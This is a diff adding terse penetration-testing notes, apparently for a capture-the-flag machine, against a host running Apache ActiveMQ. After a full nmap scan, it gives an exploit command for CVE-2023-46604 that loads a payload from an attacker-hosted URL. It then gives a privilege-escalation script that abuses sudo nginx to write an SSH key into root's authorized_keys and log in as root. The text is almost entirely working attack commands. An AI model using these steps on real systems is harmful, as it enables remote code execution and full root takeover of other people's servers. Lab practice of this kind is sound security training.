@@ -1,0 +1,115 @@
+└─$ nmap -A 10.10.11.243 -p 1-65535            
+Starting Nmap 7.93 ( https://nmap.org ) at 2024-07-29 20:53 CEST
+Nmap scan report for 10.10.11.243
+Host is up (0.033s latency).
+Not shown: 65526 closed tcp ports (conn-refused)
+PORT      STATE SERVICE    VERSION
+22/tcp    open  ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 3eea454bc5d16d6fe2d4d13b0a3da94f (ECDSA)
+|_  256 64cc75de4ae6a5b473eb3f1bcfb4e394 (ED25519)
+80/tcp    open  http       nginx 1.18.0 (Ubuntu)
+| http-auth: 
+| HTTP/1.1 401 Unauthorized\x0D
+|_  basic realm=ActiveMQRealm
+|_http-title: Error 401 Unauthorized
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+1883/tcp  open  mqtt
+| mqtt-subscribe: 
+|   Topics and their most recent payloads: 
+|_    ActiveMQ/Advisory/Consumer/Topic/#: 
+5672/tcp  open  amqp?
+| fingerprint-strings: 
+|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GetRequest, HTTPOptions, RPCCheck, RTSPRequest, SSLSessionReq, TerminalServerCookie: 
+|     AMQP
+|     AMQP
+|     amqp:decode-error
+|_    7Connection from client using unsupported AMQP attempted
+|_amqp-info: ERROR: AQMP:handshake expected header (1) frame, but was 65
+8161/tcp  open  http       Jetty 9.4.39.v20210325
+|_http-title: Error 401 Unauthorized
+| http-auth: 
+| HTTP/1.1 401 Unauthorized\x0D
+|_  basic realm=ActiveMQRealm
+|_http-server-header: Jetty(9.4.39.v20210325)
+37025/tcp open  tcpwrapped
+61613/tcp open  stomp      Apache ActiveMQ
+| fingerprint-strings: 
+|   HELP4STOMP: 
+|     ERROR
+|     content-type:text/plain
+|     message:Unknown STOMP action: HELP
+|     org.apache.activemq.transport.stomp.ProtocolException: Unknown STOMP action: HELP
+|     org.apache.activemq.transport.stomp.ProtocolConverter.onStompCommand(ProtocolConverter.java:258)
+|     org.apache.activemq.transport.stomp.StompTransportFilter.onCommand(StompTransportFilter.java:85)
+|     org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83)
+|     org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:233)
+|     org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:215)
+|_    java.lang.Thread.run(Thread.java:750)
+61614/tcp open  http       Jetty 9.4.39.v20210325
+|_http-title: Site doesn't have a title.
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Jetty(9.4.39.v20210325)
+61616/tcp open  apachemq   ActiveMQ OpenWire transport
+| fingerprint-strings: 
+|   NULL: 
+|     ActiveMQ
+|     TcpNoDelayEnabled
+|     SizePrefixDisabled
+|     CacheSize
+|     ProviderName 
+|     ActiveMQ
+|     StackTraceEnabled
+|     PlatformDetails 
+|     Java
+|     CacheEnabled
+|     TightEncodingEnabled
+|     MaxFrameSize
+|     MaxInactivityDuration
+|     MaxInactivityDurationInitalDelay
+|     ProviderVersion 
+|_    5.15.15
+
+
+https://github.com/evkl1d/CVE-2023-46604
+python exploit.py -i 10.10.11.243 -p 61616 -u http://10.10.14.5/poc.xml
+
+https://gist.github.com/DylanGrl/ab497e2f01c7d672a80ab9561a903406
+From an existing interractive session create the following exploit code:
+
+echo "[+] Creating configuration..."
+cat << EOF > /tmp/nginx_pwn.conf
+user root;
+worker_processes 4;
+pid /tmp/nginx.pid;
+events {
+        worker_connections 768;
+}
+http {
+	server {
+	        listen 1339;
+	        root /;
+	        autoindex on;
+	        dav_methods PUT;
+	}
+}
+EOF
+echo "[+] Loading configuration..."
+sudo nginx -c /tmp/nginx_pwn.conf
+echo "[+] Generating SSH Key..."
+ssh-keygen
+echo "[+] Display SSH Private Key for copy..."
+cat .ssh/id_rsa
+echo "[+] Add key to root user..."
+curl -X PUT localhost:1339/root/.ssh/authorized_keys -d "$(cat .ssh/id_rsa.pub)"
+echo "[+] Use the SSH key to get access"
+
+Then run the exploit:
+
+./exploit.sh
+
+Store the SSH Private Key then use it to connect to the host:
+
+chmod 600 root_key
+ssh -i root_key root@host
